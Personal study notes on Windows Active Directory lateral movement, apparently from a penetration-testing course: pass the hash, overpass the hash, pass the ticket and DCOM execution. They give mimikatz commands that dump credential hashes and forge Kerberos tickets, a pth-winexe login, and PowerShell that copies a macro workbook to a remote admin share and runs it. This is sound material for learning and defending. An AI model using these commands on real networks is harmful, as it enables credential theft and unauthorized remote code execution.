PASS THE HASH
OVERPASS THE HASH
PASS THE TICKET
DISTRIBUTED COMPONENT OBJECT MODEL

--------------
PASS THE HASH
--------------
∘ PASS THE HASH - Allows attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password.
‣ can be used only for NTLM and not kerberos
‣ PSExec from metasploit, Passing the hash toolkit and Impacket- Attacker connects to the victim using SMB and performs auth using NTLM hash
‣ Requires SMB connection through firewall (445) and Windows File and Print Sharing feature enabled - common in internal enterprise environments
‣ uses special admin share called Admin$. In order to establish connection to this share, attacker must present valid credentials with local admin 
permissions. Requires local admin rights
‣ Method works on AD domain accounts and built-in local admin account. Since 2014, this technique cannot be used to authenticate 
as any other local admin account
• # mimikatz # privilege::debug
• # mimikatz # token::elevate
• # mimikatz # lsadump::sam
‣ Copy the NTLM hash of local admin to kali and use pth-winexe
• $ sudo pth-winexe -U Administrator%<NTLM hash>:<NTLM hash> //ip cmd

------------------
OVERPASS THE HASH
------------------
‣ Idea is to turn NTLM hash into kerberos ticket and avoid NTLM authentication
‣ TGT or Service Ticket gives access to another computer on the network as that user
‣ first compromise workstation where jeff_admin has authenticated to - machine now caches his credentials
• simulate it by running process as jeff_admin which prompts authentication... right click notepad icon on task bar and shift right click notepad icon on pop up > run as different user > jeff_admin & password.
• launches notepad in context of jeff_admin and credentials will be cached
• mimikatz # sekurlsa::logonpasswords  // dumps cached password hashes including NTML hash
‣ On the same machine (windows), open powershell as jeff_admin using NTLM hash from previous step with the help of mimikatz
• mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:<hash> /run:PowerShell.exe
∘ check cached kerberos ticket 
‣ PS > klist // empty results since service from the domain has not been used yet
‣ PS > net use \\dc01\shared-dir
∘ PS > klist 
• gives TGT and TGS 
• use it for PSExec - can run command remotely but does not accept password hashes
• PS > PSExec.exe \\dc01 cmd.exe

----------------
PASS THE TICKET
----------------
	21.4.3	Pass the Ticket - Silver Ticket (also called kerberos golden ticket) using mimikatz 

‣ useful if no local administrator account is available
‣ The application on the server executing in the context of service account checks the user's permission from the group membership included in the service ticket. The user and group permission in the service ticket are not verified by the application. It blindly trusts the integrity of the service ticket since it is encrypted with password hash known to service account and dc.
• Obtain SID (security identifier) 
• SRIS struct - string, revision, identifier auth, subauth
• > whomai /user
• mimikatz # kerberos::purge
• mimikatz # kerberos::list
• mimikatz # kerberos::golden /user:u /domain:hacker.testlab /sid:<> /target:dc.hacker.testlab /service:HTTP /rc4:"" /ptt

-----------------------------------
DISTRIBUTED COMPONENT OBJECT MODEL
-----------------------------------
		com object is used by one process to talk to another process
		Distributed com object means one process in one computer is able to talk to another process in another computer.
		create excel com object from one computer to target
                $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))

		create macro in excel and copy it to target using powershell
                make use of the methods available within com object to run the macro contained in the workbook
                
 
 $com=[activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","192.168.0.220"))
 $localpath="c:\users\jeff_admin\myworkbook.xls"
 $lp="c:\users\jeff_admin\myworkbook.xls"
 $remotepath="\\192.168.0.220\c$\myexcel.xls"
 [System.IO.File]::Copy($localpath,$remotepath,$True)

 // creates a system profile
 $Path = "\\192.168.0.220\c$\windows\syswow64\config\systemprofile\Desktop"
 $temp = [System.IO.Directory]::createDirectory($Path)

 $workbook=$com.Workbooks.Open("C:\myexcel.xls")
 $com.Run("mymacro")


// Running macros from powershell
 $excel=new-object -comobject excel.application
 $workbook = $excel.Workbooks.Open("c:\users\sanity1\Documents\myexcelx.xls")
 $excel.Run("mymacro")
